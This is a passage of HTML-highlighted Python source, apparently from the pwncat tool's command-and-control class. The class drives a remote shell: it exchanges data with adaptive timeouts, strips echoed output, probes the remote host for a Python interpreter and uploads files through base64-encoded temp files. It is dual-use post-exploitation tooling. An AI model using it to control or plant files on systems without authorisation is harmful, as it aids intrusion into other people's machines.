        greeting = self.send_recv(<span class="hljs-literal">None</span>, <span
                            class="hljs-literal">False</span>, <span
                            class="hljs-literal">False</span>)
        <span class="hljs-keyword">if</span> greeting:
            self.print_raw(<span class="hljs-string">b"\n"</span>.join(greeting), <span
                            class="hljs-literal">True</span>)

        <span class="hljs-comment"># [2/3] Check if the remote sends a prefix with every reply</span>
        self.__set_remote_prefix()

        <span class="hljs-comment"># [3/3] Find potential Python versions</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__set_remote_python_path():
            self.print_info(<span class="hljs-string">"No Python has been found. Aborting and handing over to current shell."</span>)
            <span class="hljs-keyword">raise</span> CNCPythonNotFound()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Print Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_info</span>(<span
            class="hljs-params">self, message=None, newline=True, erase=False</span>):</span>
        <span class="hljs-comment"># type: (Optional[str], bool, bool) -&gt; None</span>
        <span class="hljs-string">"""Print a message to the local screen to inform the user.

        Args:
            message (str): The message to print.
            newline (bool): Add a newline?
            erase (bool): Erase previously printed text on the same line.
        """</span>
        end = <span class="hljs-string">"\n"</span> <span
                            class="hljs-keyword">if</span> newline <span
                            class="hljs-keyword">else</span> <span class="hljs-string">""</span>
        prefix = <span class="hljs-string">"{}[PWNCAT CnC]{} "</span>.format(self.__COLORS[<span
                            class="hljs-string">"yellow"</span>], self.__COLORS[<span
                            class="hljs-string">"reset"</span>])
        <span class="hljs-keyword">if</span> message <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span>:
            message = <span class="hljs-string">""</span>
            prefix = <span class="hljs-string">""</span>

        <span class="hljs-keyword">if</span> erase:
            print(<span class="hljs-string">"\r"</span> * <span
                            class="hljs-number">1024</span> + <span
                            class="hljs-string">"{}{}"</span>.format(prefix, message), end=end)
            sys.stdout.flush()
        <span class="hljs-keyword">else</span>:
            print(<span class="hljs-string">"{}{}"</span>.format(prefix, message), end=end)
            sys.stdout.flush()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_raw</span>(<span
            class="hljs-params">self, message, newline</span>):</span>
        <span class="hljs-comment"># type: (bytes, bool) -&gt; None</span>
        <span class="hljs-string">"""Print a message to the local screen without color/prefix.

        Args:
            message (bytes): The message to print.
            newline (bool): Add a newline?
        """</span>
        <span class="hljs-keyword">if</span> self.__py3:
            end = <span class="hljs-string">b"\n"</span> <span class="hljs-keyword">if</span> newline <span
                            class="hljs-keyword">else</span> <span class="hljs-string">b""</span>
            sys.stdout.buffer.write(<span class="hljs-string">b""</span>.join([message, end]))
        <span class="hljs-keyword">else</span>:
            end = <span class="hljs-string">"\n"</span> <span class="hljs-keyword">if</span> newline <span
                            class="hljs-keyword">else</span> <span
                            class="hljs-string">""</span>  <span
                            class="hljs-comment"># type: ignore</span>
            print(message, end=end)  <span class="hljs-comment"># type: ignore</span>

        <span class="hljs-comment"># For issues with flush (when using tail -F or equal) see links below:</span>
        <span class="hljs-comment"># https://stackoverflow.com/questions/26692284</span>
        <span class="hljs-comment"># https://docs.python.org/3/library/signal.html#note-on-sigpipe</span>
        <span class="hljs-keyword">try</span>:
            sys.stdout.flush()
        <span class="hljs-keyword">except</span> IOError:
            <span class="hljs-comment"># Python flushes standard streams on exit; redirect remaining output</span>
            <span class="hljs-comment"># to devnull to avoid another broken pipe at shutdown</span>
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, sys.stdout.fileno())

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Network Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">send</span>(<span class="hljs-params">self, data</span>):</span>
        <span class="hljs-comment"># type: (bytes) -&gt; int</span>
        <span class="hljs-string">"""Send data through a connected (TCP) or unconnected (UDP) socket.

        Args:
            data (bytes): The data to send.

        Returns:
            int: Returns total bytes sent.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """</span>
        <span class="hljs-keyword">return</span> self.__net.net.send(data)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">flush_receive</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[bytes]</span>
        <span class="hljs-string">"""Try to reveive everything which is currently being sent from remote.

        Returns:
            List[bytes]: Returns a list of bytes of received data.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """</span>
        self.print_info(<span class="hljs-string">"Flushing receive buffer (this can take some time) ..."</span>)

        self.send(<span class="hljs-string">b"\n"</span>)
        data1 = self.send_recv(<span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>, <span
                            class="hljs-literal">False</span>)
        data2 = self.send_recv(<span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>, <span
                            class="hljs-literal">False</span>)

        self.print_info(<span class="hljs-string">"Flushing receive buffer done."</span>)
        <span class="hljs-keyword">return</span> data1 + data2

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_recv</span>(<span
            class="hljs-params">self, data, strip_suffix=True, strip_echo=False</span>):</span>
        <span class="hljs-comment"># type: (Optional[bytes], bool, bool) -&gt; List[bytes]</span>
        <span class="hljs-string">"""Send data through a connected (TCP) or unconnected (UDP) socket and receive all replies.

        Args:
            data (None|bytes): The data to send. If None, will skip sending.
            strip_suffix (bool): Strip remote suffix from received data?
            strip_echo (bool): Also remove 'data' from output if server has echo'ed it?

        Returns:
            List[bytes]: Returns a list of bytes of received data.

        Raises:
            socket.error:   Except here when unconnected or connection was forcibly closed.
        """</span>
        <span class="hljs-comment"># [1/4] Send</span>
        <span class="hljs-keyword">if</span> data <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            self.__net.net.send(data)

        <span class="hljs-comment"># [2/4] Receive actual reply</span>
        responses = []

        <span class="hljs-comment"># Setup timer and current receive round</span>
        time_start = datetime.now()
        curr_round = <span class="hljs-number">0</span>

        <span class="hljs-keyword">while</span> curr_round &lt; self.__recv_rounds:
            <span class="hljs-keyword">try</span>:
                response = self.__net.net.receive()
            <span class="hljs-keyword">except</span> socket.timeout:
                time.sleep(self.__recv_timeout)
                time_step = datetime.now()
                time_diff = time_step - time_start

                self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"Timeout: Receive timed out after %f sec in %d/%d rounds"</span>,
                    time_diff.total_seconds(),
                    curr_round + <span class="hljs-number">1</span>,
                    self.__recv_rounds,
                )
                curr_round += <span class="hljs-number">1</span>
            <span class="hljs-comment"># On successful read, we can determine to adjust timings.</span>
            <span class="hljs-keyword">else</span>:
                time_end = datetime.now()
                time_diff = time_end - time_start

                self.__recv_times.append(time_diff.total_seconds())
                self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"Timeout: Receive took %f sec (avg: %f) to receive in %d/%d rounds"</span>,
                    time_diff.total_seconds(),
                    sum(self.__recv_times) / len(self.__recv_times),
                    curr_round + <span class="hljs-number">1</span>,
                    self.__recv_rounds,
                )

                <span class="hljs-comment"># Retries were required</span>
                prev_recv_timeout = self.__recv_timeout
                <span class="hljs-keyword">if</span> curr_round &gt; <span
                            class="hljs-number">1</span>:
                    self.__recv_timeout += time_diff.total_seconds()
                <span class="hljs-comment"># No retries requred</span>
                <span class="hljs-keyword">else</span>:
                    self.__recv_timeout = time_diff.total_seconds() / <span
                            class="hljs-number">2</span>

                self.__log.trace(  <span class="hljs-comment"># type: ignore</span>
                    <span class="hljs-string">"Timeout: Previous recv timeout: %f sec -&gt; new recv timeout: %f sec"</span>,
                    prev_recv_timeout,
                    self.__recv_timeout,
                )

                <span class="hljs-comment"># Add response</span>
                <span class="hljs-keyword">if</span> response:
                    responses.append(response)

                <span class="hljs-comment"># Reset the start time and round</span>
                time_start = datetime.now()
                curr_round = <span class="hljs-number">0</span>

        <span class="hljs-comment"># Return if already empty</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> responses:
            <span class="hljs-keyword">return</span> responses

        <span class="hljs-comment"># Response could be in one of the below listed formats:</span>
        <span class="hljs-comment"># 1. response could be one line per element</span>
        <span class="hljs-comment"># 2. reposnse could be multiple lines per element</span>
        <span class="hljs-comment"># 3. response cloud be single characters per element</span>
        <span class="hljs-comment"># But we want to make sure that we always get one line per element,</span>
        <span class="hljs-comment"># so we normalize it</span>

        <span class="hljs-comment"># First: Join lines which do not have line endings</span>
        self.__log.debug(<span class="hljs-string">"Normalize recv before (1): %s"</span>, repr(responses))
        normalized = []
        has_eol = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> responses:
            <span class="hljs-keyword">if</span> has_eol:
                normalized.append(line)
            <span class="hljs-keyword">else</span>:
                normalized[<span class="hljs-number">-1</span>] = normalized[<span
                            class="hljs-number">-1</span>] + line
            <span class="hljs-comment"># Determine what to do next iteration</span>
            <span class="hljs-keyword">if</span> line.endswith(<span
                            class="hljs-string">b"\r\n"</span>):
                has_eol = <span class="hljs-literal">True</span>
            <span class="hljs-keyword">elif</span> line.endswith(<span
                            class="hljs-string">b"\n"</span>):
                has_eol = <span class="hljs-literal">True</span>
            <span class="hljs-keyword">elif</span> line.endswith(<span
                            class="hljs-string">b"\r"</span>):
                has_eol = <span class="hljs-literal">True</span>
            <span class="hljs-keyword">else</span>:
                has_eol = <span class="hljs-literal">False</span>
        responses = normalized
        self.__log.debug(<span class="hljs-string">"Normalize recv after  (1): %s"</span>, repr(responses))

        <span class="hljs-comment"># Second: Separate lines which have line endings</span>
        self.__log.debug(<span class="hljs-string">"Normalize recv before (2): %s"</span>, repr(responses))
        normalized = []
        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> responses:
            line = line.rstrip(<span class="hljs-string">b"\r\n"</span>)
            line = line.rstrip(<span class="hljs-string">b"\n"</span>)
            line = line.rstrip(<span class="hljs-string">b"\r"</span>)
            line = line.lstrip(<span class="hljs-string">b"\r\n"</span>)
            line = line.lstrip(<span class="hljs-string">b"\n"</span>)
            line = line.lstrip(<span class="hljs-string">b"\r"</span>)
            <span class="hljs-keyword">if</span> <span class="hljs-string">b"\r\n"</span> <span
                            class="hljs-keyword">in</span> line:
                <span class="hljs-keyword">for</span> newline <span class="hljs-keyword">in</span> line.split(<span
                            class="hljs-string">b"\r\n"</span>):
                    normalized.append(newline)
            <span class="hljs-keyword">elif</span> <span class="hljs-string">b"\n"</span> <span
                            class="hljs-keyword">in</span> line:
                <span class="hljs-keyword">for</span> newline <span class="hljs-keyword">in</span> line.split(<span
                            class="hljs-string">b"\n"</span>):
                    normalized.append(newline)
            <span class="hljs-keyword">elif</span> <span class="hljs-string">b"\r"</span> <span
                            class="hljs-keyword">in</span> line:
                <span class="hljs-keyword">for</span> newline <span class="hljs-keyword">in</span> line.split(<span
                            class="hljs-string">b"\r"</span>):
                    normalized.append(newline)
            <span class="hljs-keyword">else</span>:
                normalized.append(line)
        responses = normalized
        self.__log.debug(<span class="hljs-string">"Normalize recv after  (2): %s"</span>, repr(responses))

        <span class="hljs-comment"># [3/4] Remove remote ends suffix (if it sends something like it)</span>
        <span class="hljs-comment"># We iterate reversed of responses and check if the new line suffix(es)</span>
        <span class="hljs-comment"># are present at the end.</span>
        <span class="hljs-comment"># This is because the suffix(es) is always received last.</span>
        <span class="hljs-keyword">if</span> self.__remote_suffix <span
                            class="hljs-keyword">and</span> strip_suffix:
            <span class="hljs-comment"># If multiple suffix lines are send we will first strip x-1 suffix lines</span>
            <span class="hljs-keyword">if</span> len(self.__remote_suffix) &gt; <span
                            class="hljs-number">1</span>:
                lines_to_strip = len(self.__remote_suffix) - <span class="hljs-number">1</span>
                self.__log.debug(<span class="hljs-string">"Remove suffix before (1): %s"</span>, repr(responses))
                responses = responses[:-lines_to_strip]
                self.__log.debug(<span class="hljs-string">"Remove suffix after  (1): %s"</span>, repr(responses))

            <span class="hljs-comment"># Return if already empty</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> responses:
                <span class="hljs-keyword">return</span> responses

            <span class="hljs-comment"># Clean up the last response line with first suffix line</span>
            self.__log.debug(<span class="hljs-string">"Remove suffix before (2): %s"</span>, repr(responses))
            responses[<span class="hljs-number">-1</span>] = responses[<span
                            class="hljs-number">-1</span>].rstrip(self.__remote_suffix[<span
                            class="hljs-number">0</span>])
            self.__log.debug(<span class="hljs-string">"Remove suffix after  (2): %s"</span>, repr(responses))

            <span class="hljs-comment"># Ensure empty elements are removed</span>
            self.__log.debug(<span class="hljs-string">"Remove suffix before (3): %s"</span>, repr(responses))
            responses = [item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> responses <span
                            class="hljs-keyword">if</span> item]
            self.__log.debug(<span class="hljs-string">"Remove suffix after  (3): %s"</span>, repr(responses))

        <span class="hljs-comment"># [4/4] Some server also echo back what we've send, so if we did send something</span>
        <span class="hljs-comment"># we need to strip this off as well</span>
        <span class="hljs-keyword">if</span> data <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">and</span> strip_echo:
            <span class="hljs-keyword">for</span> idx, item <span class="hljs-keyword">in</span> enumerate(responses):
                <span class="hljs-keyword">if</span> data <span class="hljs-keyword">in</span> responses[idx]:
                    <span class="hljs-keyword">del</span> responses[idx]
                <span class="hljs-keyword">elif</span> data.rstrip() <span
                            class="hljs-keyword">in</span> responses[idx]:
                    <span class="hljs-keyword">del</span> responses[idx]
                <span class="hljs-comment"># Ensure empty elements are removed</span>
                responses = [item <span class="hljs-keyword">for</span> item <span
                            class="hljs-keyword">in</span> responses <span
                            class="hljs-keyword">if</span> item]

        <span class="hljs-comment"># Return list of respones</span>
        <span class="hljs-keyword">return</span> responses

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># High-level Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remote_command</span>(<span
            class="hljs-params">self, command, output</span>):</span>
        <span class="hljs-comment"># type: (str, bool) -&gt; Optional[List[bytes]]</span>
        <span class="hljs-string">"""Run remote command with correct linefeeds and receive response lines.

        Args:
            command (str): The command to execute on the remote end.
            output (bool): Receive output from command?
        """</span>
        command = command.rstrip(<span class="hljs-string">"\r\n"</span>)
        command = command.rstrip(<span class="hljs-string">"\r"</span>)
        command = command.rstrip(<span class="hljs-string">"\n"</span>)
        command = command + <span class="hljs-string">"\n"</span>
        <span class="hljs-keyword">if</span> output:
            <span class="hljs-keyword">return</span> self.send_recv(StringEncoder.encode(command), <span
                            class="hljs-literal">True</span>, <span class="hljs-literal">True</span>)
        self.send(StringEncoder.encode(command))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_remote_tmpfile</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
        <span class="hljs-string">"""OS-independent remote tempfile creation.

        Returns:
            str or None: Returns path on success or None on error.
        """</span>
        self.flush_receive()
        self.print_info(<span class="hljs-string">"Creating tmpfile:"</span>, <span
                            class="hljs-literal">False</span>, <span
                            class="hljs-literal">True</span>)

        command = []
        command.append(<span class="hljs-string">"{} -c '"</span>.format(self.__remote_python))
        command.append(<span class="hljs-string">"import tempfile;"</span>)
        command.append(<span class="hljs-string">"h,f=tempfile.mkstemp();"</span>)
        <span class="hljs-keyword">if</span> self.__remote_py3:
            command.append(<span class="hljs-string">"print(f);"</span>)
        <span class="hljs-keyword">else</span>:
            command.append(<span class="hljs-string">"print f;"</span>)
        command.append(<span class="hljs-string">"'"</span>)
        response = self.remote_command(<span class="hljs-string">""</span>.join(command), <span
                            class="hljs-literal">True</span>)

        <span class="hljs-comment"># All good</span>
        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">and</span> len(response) == <span
                            class="hljs-number">1</span>:
            tmpfile = StringEncoder.decode(response[<span class="hljs-number">0</span>]).rstrip()
            self.print_info(<span class="hljs-string">"Creating tmpfile: {}"</span>.format(repr(tmpfile)), <span
                            class="hljs-literal">True</span>, <span class="hljs-literal">True</span>)
            <span class="hljs-keyword">return</span> tmpfile

        <span class="hljs-comment"># Something went wrong with stripping prefix from server, we need to manually</span>
        <span class="hljs-comment"># check if creation was successful.</span>
        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">and</span> len(response) &gt; <span
                            class="hljs-number">1</span>:
            <span class="hljs-comment"># A bit fuzzy, but we try a few times</span>
            <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span
                            class="hljs-number">5</span>):
                self.print_info(<span class="hljs-string">"Creating tmpfile: Unsure - checking otherwise"</span>, <span
                            class="hljs-literal">True</span>, <span class="hljs-literal">True</span>)
                <span class="hljs-keyword">for</span> candidate <span class="hljs-keyword">in</span> response:
                    tmpfile = StringEncoder.decode(candidate).rstrip()
                    <span class="hljs-keyword">if</span> self.remote_file_exists(tmpfile):
                        self.print_info(<span class="hljs-string">"Creating tmpfile: {}"</span>.format(repr(tmpfile)), <span
                            class="hljs-literal">True</span>, <span class="hljs-literal">True</span>)
                        <span class="hljs-keyword">return</span> tmpfile

        self.print_info(<span class="hljs-string">"Creating tmpfile: Failed"</span>, <span
                            class="hljs-literal">True</span>, <span class="hljs-literal">True</span>)
        self.print_info(<span class="hljs-string">"Response: {}"</span>.format(repr(response)))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remote_file_exists</span>(<span
            class="hljs-params">self, remote_path</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; bool</span>
        <span class="hljs-string">"""Ensure given remote path exists as a file on remote end.

        Args:
            remote_path (str): Path of file to check.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        self.flush_receive()

        <span class="hljs-comment"># String should be short as an unstable remote might send small chunks</span>
        unique_string = <span class="hljs-string">"_pwncat_"</span>
        response = self.remote_command(
            <span class="hljs-string">'test -f "{}" &amp;&amp; echo "{}"'</span>.format(remote_path, unique_string), <span
                            class="hljs-literal">True</span>
        )
        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">for</span> candidate <span class="hljs-keyword">in</span> response:
                <span class="hljs-keyword">if</span> StringEncoder.decode(candidate) == unique_string:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
                <span class="hljs-keyword">if</span> StringEncoder.decode(candidate).rstrip() == unique_string:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        response = self.flush_receive()
        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">for</span> candidate <span class="hljs-keyword">in</span> response:
                <span class="hljs-keyword">if</span> StringEncoder.decode(candidate).rstrip() == unique_string:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
                <span class="hljs-keyword">if</span> StringEncoder.decode(candidate).rstrip() == unique_string:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>(<span
            class="hljs-params">self, lpath, rpath</span>):</span>
        <span class="hljs-comment"># type: (str, str) -&gt; bool</span>
        <span class="hljs-string">"""OS-independent upload of a local file to a remote path.

        Args:
            lpath (str): Local path of the file.
            rpath (str): Remote path, where to upload the base64 encoded file.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        <span class="hljs-keyword">assert</span> self.__remote_python <span
                            class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">assert</span> self.__remote_py3 <span
                            class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>

        rpath_b64 = self.create_remote_tmpfile()
        self.flush_receive()
        <span class="hljs-keyword">if</span> rpath_b64 <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__upload_file_base_64_encoded(lpath, rpath_b64, <span
                            class="hljs-literal">True</span>):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__remote_base64_decode(rpath_b64, rpath):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Private Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__set_remote_prefix</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; None</span>
        <span class="hljs-string">"""Determines if the remote always sends a specific prefix with its other data."""</span>
        self.__remote_prefix = []
        self.__remote_suffix = []

        has_suffix = <span class="hljs-literal">False</span>

        self.print_info(<span class="hljs-string">"Checking if remote sends prefix/suffix to every request..."</span>)
        response = self.send_recv(<span class="hljs-string">b'echo "__pwn__"\n'</span>)
        expected = <span class="hljs-string">b"__pwn__"</span>

        <span class="hljs-keyword">if</span> response:
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response:
                <span class="hljs-comment"># If the line begins with our expected response, all data after that</span>
                <span class="hljs-comment"># is a suffix that the server might be sending.</span>
                <span class="hljs-keyword">if</span> re.match(expected, line):
                    has_suffix = <span class="hljs-literal">True</span>
                    <span class="hljs-comment"># If bytes are still left after our response, add it</span>
                    <span class="hljs-keyword">if</span> line.replace(expected, <span
                            class="hljs-string">b""</span>, <span class="hljs-number">1</span>):
                        self.__remote_suffix.append(line.replace(expected, <span
                            class="hljs-string">b""</span>, <span class="hljs-number">1</span>))
                    <span class="hljs-keyword">continue</span>
                <span class="hljs-keyword">if</span> has_suffix:
                    self.__remote_suffix.append(line)

        <span class="hljs-comment"># Ensure empty elements are removed</span>
        self.__log.debug(<span class="hljs-string">"Set suffix before: %s"</span>, repr(self.__remote_suffix))
        self.__remote_suffix = [item <span class="hljs-keyword">for</span> item <span
                            class="hljs-keyword">in</span> self.__remote_suffix <span
                            class="hljs-keyword">if</span> item]
        self.__log.debug(<span class="hljs-string">"Set suffix after:  %s"</span>, repr(self.__remote_suffix))

        <span class="hljs-keyword">if</span> self.__remote_prefix:
            self.print_info(<span class="hljs-string">"Remote prefix ({} lines):"</span>.format(len(self.__remote_prefix)))
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> self.__remote_prefix:
                self.print_raw(repr(line).encode(), <span class="hljs-literal">True</span>)
        <span class="hljs-keyword">else</span>:
            self.print_info(<span class="hljs-string">"Remote does not send prefix"</span>)
        <span class="hljs-keyword">if</span> self.__remote_suffix:
            self.print_info(<span class="hljs-string">"Remote suffix ({} lines):"</span>.format(len(self.__remote_suffix)))
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> self.__remote_suffix:
                self.print_raw(repr(line).encode(), <span class="hljs-literal">True</span>)
        <span class="hljs-keyword">else</span>:
            self.print_info(<span class="hljs-string">"Remote does not send suffix"</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get_remote_python_version</span>(<span
            class="hljs-params">self, path</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; Optional[str]</span>
        <span class="hljs-string">"""Get remote Python version by path.

        Args:
            path (str): Path to potential python binary.

        Returns:
            Optional[str]: Python version string or None if not found.
        """</span>
        command = []
        command.append(<span class="hljs-string">"{} -c '"</span>.format(path))
        command.append(<span class="hljs-string">"from __future__ import print_function;"</span>)
        command.append(<span class="hljs-string">"import sys;"</span>)
        command.append(<span class="hljs-string">"v=sys.version_info;"</span>)
        command.append(<span
                            class="hljs-string">'print("{}.{}.{}".format(v[0], v[1], v[2]));\''</span>)

        response = self.remote_command(<span class="hljs-string">""</span>.join(command), <span
                            class="hljs-literal">True</span>)

        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">and</span> response:
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response:
                match = re.search(<span class="hljs-string">b"^([.0-9]+)"</span>, line)
                <span class="hljs-comment"># Potential version candidate</span>
                <span class="hljs-keyword">if</span> match:
                    version = StringEncoder.decode(match.group(<span class="hljs-number">1</span>))
                    <span class="hljs-keyword">if</span> version[<span class="hljs-number">0</span>] <span
                            class="hljs-keyword">in</span> [<span
                            class="hljs-string">"2"</span>, <span class="hljs-string">"3"</span>]:
                        <span class="hljs-keyword">return</span> version
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__set_remote_python_path</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Enumerate remote Python binary.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """</span>
        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Make windows compatible</span>
        <span class="hljs-comment"># [1/2] 'which' method</span>
        <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> self.__PYTHON_NAMES:
            self.print_info(<span class="hljs-string">"Probing for: which {}"</span>.format(name))
            response = self.remote_command(<span
                            class="hljs-string">"which {} 2&gt;/dev/null"</span>.format(name), <span
                            class="hljs-literal">True</span>)
            <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">and</span> response:
                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response:
                    path = StringEncoder.decode(line)
                    self.print_info(<span class="hljs-string">"Potential path: {}"</span>.format(path))
                    version = self.__get_remote_python_version(path)
                    <span class="hljs-keyword">if</span> version <span
                            class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
                        <span class="hljs-keyword">continue</span>

                    <span class="hljs-keyword">if</span> version[<span class="hljs-number">0</span>] == <span
                            class="hljs-string">"2"</span>:
                        self.__remote_py3 = <span class="hljs-literal">False</span>
                    <span class="hljs-keyword">if</span> version[<span class="hljs-number">0</span>] == <span
                            class="hljs-string">"3"</span>:
                        self.__remote_py3 = <span class="hljs-literal">True</span>
                    self.print_info(<span
                            class="hljs-string">"Found valid Python{} version: {}"</span>.format(version[<span
                            class="hljs-number">0</span>], version))
                    self.__remote_python = path
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Make windows compatible</span>
        <span class="hljs-comment"># [2/2] Absolute path method</span>
        <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> self.__PYTHON_PATHS:
            <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> self.__PYTHON_NAMES:

                python = path + <span class="hljs-string">"/"</span> + name
                self.print_info(<span class="hljs-string">"Probing for: {}"</span>.format(python))
                rpath_lines = self.remote_command(
                    <span class="hljs-string">"test -f {p} &amp;&amp; echo {p} || echo"</span>.format(p=python), <span
                            class="hljs-literal">True</span>
                )
                <span class="hljs-keyword">if</span> rpath_lines <span
                            class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">and</span> rpath_lines:
                    <span class="hljs-comment"># Reset current round</span>
                    path_found = <span class="hljs-literal">False</span>

                    <span class="hljs-comment"># We expect a length of one, but we handle errors as well.</span>
                    <span class="hljs-keyword">for</span> rpath_line <span
                            class="hljs-keyword">in</span> rpath_lines:
                        <span class="hljs-keyword">if</span> StringEncoder.decode(rpath_line).rstrip() == python:
                            path_found = <span class="hljs-literal">True</span>
                            <span class="hljs-keyword">break</span>
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> path_found:
                        <span class="hljs-keyword">continue</span>

                    <span class="hljs-comment"># Potential python candidate</span>
                    self.print_info(<span class="hljs-string">"Potential path: {}"</span>.format(python))
                    version = self.__get_remote_python_version(python)
                    <span class="hljs-keyword">if</span> version <span
                            class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
                        <span class="hljs-keyword">continue</span>

                    <span class="hljs-keyword">if</span> version[<span class="hljs-number">0</span>] == <span
                            class="hljs-string">"2"</span>:
                        self.__remote_py3 = <span class="hljs-literal">False</span>
                    <span class="hljs-keyword">if</span> version[<span class="hljs-number">0</span>] == <span
                            class="hljs-string">"3"</span>:
                        self.__remote_py3 = <span class="hljs-literal">True</span>
                    self.print_info(<span
                            class="hljs-string">"Found valid Python{} version: {}"</span>.format(version[<span
                            class="hljs-number">0</span>], version))
                    self.__remote_python = python
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

